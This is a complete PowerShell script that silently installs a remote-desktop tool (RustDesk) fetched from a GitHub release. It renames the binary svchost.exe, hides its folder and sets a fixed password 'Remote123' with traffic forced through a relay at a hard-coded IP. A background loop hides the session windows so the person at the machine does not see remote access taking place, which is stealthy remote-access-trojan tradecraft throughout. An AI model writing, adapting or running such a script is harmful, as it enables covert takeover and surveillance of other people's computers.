function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST       = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE        = "$DEST\svchost.exe"        # renamed from chrome.exe — blends with Windows
    $DLL        = "$DEST\sciter.dll"
    $CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
    $SCITER_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"
    $cfgDir     = "$env:APPDATA\RustDesk\config"

    # 1. Kill old + clean
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
    Get-Process chrome  -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST -Force | Out-Null

    # 2. Download in parallel
    Write-Host "Installing..." -ForegroundColor Cyan
    $wc1 = New-Object System.Net.WebClient
    $wc2 = New-Object System.Net.WebClient
    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue
    Register-ObjectEvent $wc1 DownloadFileCompleted -SourceIdentifier "RDCHR" | Out-Null
    Register-ObjectEvent $wc2 DownloadFileCompleted -SourceIdentifier "RDSCT" | Out-Null
    $wc1.DownloadFileAsync([uri]$CHROME_URL, $EXE)
    $wc2.DownloadFileAsync([uri]$SCITER_URL, $DLL)
    $null = Wait-Event -SourceIdentifier "RDCHR" -Timeout 120
    $null = Wait-Event -SourceIdentifier "RDSCT" -Timeout 120
    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; return
    }

    # 3. Config — permanent password + force relay
    New-Item -ItemType Directory $cfgDir -Force | Out-Null
    Set-Content "$cfgDir\RustDesk.toml"  "enc_id = ''"            -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "password = 'Remote123'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "salt = ''"              -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "key_confirmed = true"   -Encoding UTF8
    Set-Content "$cfgDir\RustDesk2.toml" "rendezvous_server = '34.107.221.82'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "relay_server = '34.107.221.82'"      -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "nat_type = 1"                        -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "serial = 0"                          -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "[options]"                           -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "verification-method = 'use-permanent-password'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'"           -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "direct-server = 'N'"                 -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "force-always-relay = 'Y'"            -Encoding UTF8

    # 4. Hide folder
    $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 2 -bor 4

    # 5. Get ID
    $RDID = ""
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName = $EXE; $psiId.Arguments = "--get-id"
    $psiId.UseShellExecute = $false; $psiId.RedirectStandardOutput = $true
    $psiId.RedirectStandardError = $true; $psiId.CreateNoWindow = $true
    $prId   = [System.Diagnostics.Process]::Start($psiId)
    $outT   = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    if (!$prId.HasExited) { $prId.Kill() }
    $RDID = $outT.Result.Trim()

    if (!$RDID -or $RDID -notmatch '^\d+$') {
        $psi0 = New-Object System.Diagnostics.ProcessStartInfo
        $psi0.FileName = $EXE; $psi0.UseShellExecute = $true
        $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $pr0 = [System.Diagnostics.Process]::Start($psi0); Start-Sleep 5
        $pr0 | Stop-Process -Force -EA SilentlyContinue; Start-Sleep 2
        $psiId2 = New-Object System.Diagnostics.ProcessStartInfo
        $psiId2.FileName = $EXE; $psiId2.Arguments = "--get-id"
        $psiId2.UseShellExecute = $false; $psiId2.RedirectStandardOutput = $true
        $psiId2.CreateNoWindow = $true
        $prId2  = [System.Diagnostics.Process]::Start($psiId2)
        $outT2  = $prId2.StandardOutput.ReadToEndAsync()
        $prId2.WaitForExit(8000) | Out-Null
        if (!$prId2.HasExited) { $prId2.Kill() }
        $RDID = $outT2.Result.Trim()
    }

    # 6. Write accept.ps1 — 50ms poll loop, hides by window class H-SMILE-FRAME
    $acceptPs = "$DEST\accept.ps1"
    Set-Content $acceptPs @'
Add-Type @"
using System; using System.Runtime.InteropServices; using System.Text;
public class WH2 {
    [DllImport("user32.dll")] public static extern bool EnumWindows(EWP p, IntPtr l);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
    [DllImport("user32.dll")] public static extern int GetClassName(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern int GetWindowTextLength(IntPtr h);
    public delegate bool EWP(IntPtr h, IntPtr l);
}
"@
$DEST    = "$env:LOCALAPPDATA\WinSystemUpdate"
$exePath = "$DEST\svchost.exe"
while($true){
    Start-Sleep -Milliseconds 50
    $rdPids = @()
    Get-Process svchost -EA SilentlyContinue | Where-Object{$_.Path -eq $exePath} | ForEach-Object{$rdPids += $_.Id}
    if($rdPids.Count -eq 0){ break }
    [WH2]::EnumWindows({
        param($h,$l)
        $p2=0; [WH2]::GetWindowThreadProcessId($h,[ref]$p2)|Out-Null
        if($p2 -notin $script:rdPids){ return $true }
        $csb=New-Object System.Text.StringBuilder(64); [WH2]::GetClassName($h,$csb,64)|Out-Null
        if($csb.ToString() -eq "H-SMILE-FRAME"){
            $tsb=New-Object System.Text.StringBuilder(64); [WH2]::GetWindowText($h,$tsb,64)|Out-Null
            $t=$tsb.ToString()
            if($t -ne "Chrome" -and $t -ne ""){
                [WH2]::ShowWindow($h,0)|Out-Null
            }
        }
        return $true
    },[IntPtr]::Zero)|Out-Null
}
'@ -Encoding UTF8

    # 7. Launch hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $EXE; $psi.WorkingDirectory = $DEST
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    # 8. Start accept.ps1 IMMEDIATELY (before RustDesk window shows)
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$acceptPs`"" -WindowStyle Hidden

    Start-Sleep 4

    # 9. Also hide any window that slipped through
    Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }

    # 10. delete.ps1
    $deletePs = "$DEST\delete.ps1"
    Set-Content  $deletePs  '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
    Add-Content  $deletePs  'Get-Process svchost -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $deletePs  'Start-Sleep 2; Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $deletePs  'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII

    # 11. Desktop shortcut
    $lnkPath = $null
    foreach ($dp in @([Environment]::GetFolderPath('Desktop'), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
        if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
    }
    if ($lnkPath) {
        $sh = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
        $sh.TargetPath = "powershell.exe"
        $sh.Arguments  = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
        $sh.IconLocation = "shell32.dll,131"; $sh.Save()
    }

    # 12. 1-hour auto-delete
    $timerPs = "$DEST\timer.ps1"
    Set-Content  $timerPs  '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
    Add-Content  $timerPs  'Start-Sleep 3600' -Encoding ASCII
    Add-Content  $timerPs  'Get-Process svchost -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $timerPs  'Start-Sleep 2; Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $timerPs  'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$timerPs`"" -WindowStyle Hidden

    # 13. Done
    Write-Host ""
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
    Write-Host "   Password: Remote123" -ForegroundColor Cyan
    Write-Host "   Desktop shortcut: DELETE CHROME" -ForegroundColor Gray
    Write-Host "   Auto-deletes in 1 hour." -ForegroundColor Gray
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host ""
}
Install-RD
